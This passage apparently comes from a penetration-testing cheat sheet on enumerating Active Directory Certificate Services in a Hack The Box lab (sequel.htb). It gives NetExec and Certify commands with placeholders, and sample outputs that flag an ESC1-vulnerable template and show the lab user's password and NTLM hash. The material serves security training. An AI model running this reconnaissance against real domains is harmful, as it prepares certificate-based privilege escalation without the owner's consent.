</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Enumeration output:
</span></span></span><span class="line"><span class="cl"><span class="go">Certificate Authorities
</span></span></span><span class="line"><span class="cl"><span class="go">  0
</span></span></span><span class="line"><span class="cl"><span class="go">    CA Name                             : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    DNS Name                            : dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Validity End            : 2121-11-18 21:08:46+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Web Enrollment
</span></span></span><span class="line"><span class="cl"><span class="go">      HTTP
</span></span></span><span class="line"><span class="cl"><span class="go">        Enabled                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">      HTTPS
</span></span></span><span class="line"><span class="cl"><span class="go">        Enabled                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">    User Specified SAN                  : Disabled
</span></span></span><span class="line"><span class="cl"><span class="go">    Request Disposition                 : Issue
</span></span></span><span class="line"><span class="cl"><span class="go">    Enforce Encryption for Requests     : Enabled
</span></span></span><span class="line"><span class="cl"><span class="go">    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Owner                             : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">      Access Rights
</span></span></span><span class="line"><span class="cl"><span class="go">        ManageCa                        : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        ManageCertificates              : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Enroll                          : SEQUEL.HTB\Authenticated Users
</span></span></span><span class="line"><span class="cl"><span class="go">Certificate Templates
</span></span></span><span class="line"><span class="cl"><span class="go">  0
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Name                       : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Display Name                        : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Authorities             : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    Enabled                             : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Client Authentication               : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Agent                    : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Any Purpose                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollee Supplies Subject           : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Name Flag               : EnrolleeSuppliesSubject
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Flag                     : IncludeSymmetricAlgorithms
</span></span></span><span class="line"><span class="cl"><span class="go">                                          PublishToDs
</span></span></span><span class="line"><span class="cl"><span class="go">    Private Key Flag                    : ExportableKey
</span></span></span><span class="line"><span class="cl"><span class="go">    Extended Key Usage                  : Client Authentication
</span></span></span><span class="line"><span class="cl"><span class="go">                                          Secure Email
</span></span></span><span class="line"><span class="cl"><span class="go">                                          Encrypting File System
</span></span></span><span class="line"><span class="cl"><span class="go">    Requires Manager Approval           : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Requires Key Archival               : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Authorized Signatures Required      : 0
</span></span></span><span class="line"><span class="cl"><span class="go">    Schema Version                      : 2
</span></span></span><span class="line"><span class="cl"><span class="go">    Validity Period                     : 10 years
</span></span></span><span class="line"><span class="cl"><span class="go">    Renewal Period                      : 6 weeks
</span></span></span><span class="line"><span class="cl"><span class="go">    Minimum RSA Key Length              : 2048
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Created                    : 2022-11-18T21:10:22+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Last Modified              : 2024-01-19T00:26:38+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Enrollment Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Enrollment Rights               : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">      Object Control Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Owner                           : SEQUEL.HTB\Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">        Full Control Principals         : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Owner Principals          : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Property Enroll           : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">    [!] Vulnerabilities
</span></span></span><span class="line"><span class="cl"><span class="go">      ESC1                              : Enrollee supplies subject and template allows client authentication.
</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set1-1" data-tabcontent="tab2"><div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">nxc ldap <span class="o editable-keyword">&lt;TARGET&gt;</span> -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -M adcs
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> nxc ldap dc.sequel.htb -d sequel.htb -u <span class="s1">'ryan.cooper'</span> -p <span class="s1">'NuclearMosquito3'</span> -M adcs
</span></span><span class="line"><span class="cl"><span class="go">LDAP        10.129.33.22    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.129.33.22    636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        10.129.33.22    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        10.129.33.22    389    DC               Found PKI Enrollment Server: dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        10.129.33.22    389    DC               Found CN: sequel-DC-CA
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">nxc ldap <span class="o editable-keyword">&lt;TARGET&gt;</span> -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -H '<span class="o editable-keyword">&lt;HASH&gt;</span>' -M adcs
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> nxc ldap dc.sequel.htb -d sequel.htb -u <span class="s1">'ryan.cooper'</span> -H <span class="s1">'98981eed8e9ce0763bb3c5b3c7ed5945'</span> -M adcs
</span></span><span class="line"><span class="cl"><span class="go">LDAP        10.129.33.22    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.129.33.22    636    DC               [+] sequel.htb\ryan.cooper:98981eed8e9ce0763bb3c5b3c7ed5945 
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        10.129.33.22    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        10.129.33.22    389    DC               Found PKI Enrollment Server: dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        10.129.33.22    389    DC               Found CN: sequel-DC-CA
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">nxc ldap <span class="o editable-keyword">&lt;TARGET&gt;</span> -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k --kdcHost <span class="o editable-keyword">&lt;DC&gt;</span> -M adcs
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> nxc ldap dc.sequel.htb -d sequel.htb -u <span class="s1">'ryan.cooper'</span> -p <span class="s1">'NuclearMosquito3'</span> -k --kdcHost dc.sequel.htb -M adcs
</span></span><span class="line"><span class="cl"><span class="go">LDAP        dc.sequel.htb   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       dc.sequel.htb   636    DC               [+] sequel.htb\ryan.cooper 
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        dc.sequel.htb   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        dc.sequel.htb   389    DC               Found PKI Enrollment Server: dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        dc.sequel.htb   389    DC               Found CN: sequel-DC-CA
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">nxc ldap <span class="o editable-keyword">&lt;TARGET&gt;</span> -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -H '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k --kdcHost <span class="o editable-keyword">&lt;DC&gt;</span> -M adcs
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> nxc ldap dc.sequel.htb -d sequel.htb -u <span class="s1">'ryan.cooper'</span> -H <span class="s1">'98981eed8e9ce0763bb3c5b3c7ed5945'</span> -k --kdcHost dc.sequel.htb -M adcs
</span></span><span class="line"><span class="cl"><span class="go">LDAP        dc.sequel.htb   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       dc.sequel.htb   636    DC               [+] sequel.htb\ryan.cooper 
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        dc.sequel.htb   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        dc.sequel.htb   389    DC               Found PKI Enrollment Server: dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        dc.sequel.htb   389    DC               Found CN: sequel-DC-CA
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">nxc ldap <span class="o editable-keyword">&lt;TARGET&gt;</span> -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -k --kdcHost <span class="o editable-keyword">&lt;DC&gt;</span> --use-kcache -M adcs
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> nxc ldap dc.sequel.htb -d sequel.htb -u <span class="s1">'ryan.cooper'</span> -k --kdcHost dc.sequel.htb --use-kcache -M adcs
</span></span><span class="line"><span class="cl"><span class="go">LDAP        dc.sequel.htb   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       dc.sequel.htb   636    DC               [+] sequel.htb\ryan.cooper 
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        dc.sequel.htb   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        dc.sequel.htb   389    DC               Found PKI Enrollment Server: dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">ADCS        dc.sequel.htb   389    DC               Found CN: sequel-DC-CA
</span></span></span></div></pre></div></div></div>
</div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><p class="tabs"><button data-tabset="set1-2" data-tabcontent="tab1" class="active">certify</button>
<button data-tabset="set1-2" data-tabcontent="tab2">powershell</button></p>
<div class="tabset-wrapper" data-tabset-group="set1-2"><div class="tabcontent" data-tabset="set1-2" data-tabcontent="tab1"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Enum CAs
</span></span><span class="line"><span class="cl"><span class="go">.\Certify.exe enum-cas
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Ryan.Cooper\Documents&gt; .\Certify.exe enum-cas
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   _____          _   _  __          
</span></span></span><span class="line"><span class="cl"><span class="go">  / ____|        | | (_)/ _|         
</span></span></span><span class="line"><span class="cl"><span class="go"> | |     ___ _ __| |_ _| |_ _   _    
</span></span></span><span class="line"><span class="cl"><span class="go"> | |    / _ \ '__| __| |  _| | | |   
</span></span></span><span class="line"><span class="cl"><span class="go"> | |___|  __/ |  | |_| | | | |_| |   
</span></span></span><span class="line"><span class="cl"><span class="go">  \_____\___|_|   \__|_|_|  \__, |   
</span></span></span><span class="line"><span class="cl"><span class="go">                             __/ |   
</span></span></span><span class="line"><span class="cl"><span class="go">                            |___./   
</span></span></span><span class="line"><span class="cl"><span class="go">  v2.0.0                         
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Find certificate authorities
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Root CAs
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Start Date               : 11/18/2022 12:58:46 PM
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert End Date                 : 11/18/2121 1:08:46 PM
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] NTAuthCertificates - Certificates that enable authentication:
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Start Date               : 11/18/2022 12:58:46 PM
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert End Date                 : 11/18/2121 1:08:46 PM
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">[X] AuthWithChannelBinding HTTP request for URL 'http://dc.sequel.htb/certsrv/' failed with error: An error occurred while sending the request.
</span></span></span><span class="line"><span class="cl"><span class="go">[X] AuthWithChannelBinding HTTP request for URL 'https://dc.sequel.htb/certsrv/' failed with error: An error occurred while sending the request.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Enterprise/enrollment certificate authorities:
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Enterprise CA Name            : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    DNS Hostname                  : dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">    FullName                      : dc.sequel.htb\sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Start Date               : 11/18/2022 12:58:46 PM
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert End Date                 : 11/18/2121 1:08:46 PM
</span></span></span><span class="line"><span class="cl"><span class="go">    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    User Specifies SAN            : Disabled
</span></span></span><span class="line"><span class="cl"><span class="go">    RPC Request Encryption        : Enabled
</span></span></span><span class="line"><span class="cl"><span class="go">    CA Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Owner: BUILTIN\Administrators             S-1-5-32-544
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      Access Rights                                     Principal
</span></span></span><span class="line"><span class="cl"><span class="go">      Allow  Enroll                                     NT AUTHORITY\Authenticated Users   S-1-5-11
</span></span></span><span class="line"><span class="cl"><span class="go">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators             S-1-5-32-544
</span></span></span><span class="line"><span class="cl"><span class="go">      Allow  ManageCA, ManageCertificates               sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
</span></span></span><span class="line"><span class="cl"><span class="go">      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Agent Restrictions : None
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Enabled Certificate Templates:
</span></span></span><span class="line"><span class="cl"><span class="go">        UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">        DirectoryEmailReplication
</span></span></span><span class="line"><span class="cl"><span class="go">        DomainControllerAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">        KerberosAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">        EFSRecovery
</span></span></span><span class="line"><span class="cl"><span class="go">        EFS
</span></span></span><span class="line"><span class="cl"><span class="go">        DomainController
</span></span></span><span class="line"><span class="cl"><span class="go">        WebServer
</span></span></span><span class="line"><span class="cl"><span class="go">        Machine
</span></span></span><span class="line"><span class="cl"><span class="go">        User
</span></span></span><span class="line"><span class="cl"><span class="go">        SubCA
</span></span></span><span class="line"><span class="cl"><span class="go">        Administrator
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Certify completed in 00:00:40.0515822
</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Find vulnerable templates
</span></span><span class="line"><span class="cl"><span class="go">.\Certify.exe enum-templates --filter-vulnerable --current-user
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Ryan.Cooper\Documents&gt; .\Certify.exe enum-templates --filter-vulnerable --current-user
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   _____          _   _  __          
</span></span></span><span class="line"><span class="cl"><span class="go">  / ____|        | | (_)/ _|         
</span></span></span><span class="line"><span class="cl"><span class="go"> | |     ___ _ __| |_ _| |_ _   _    
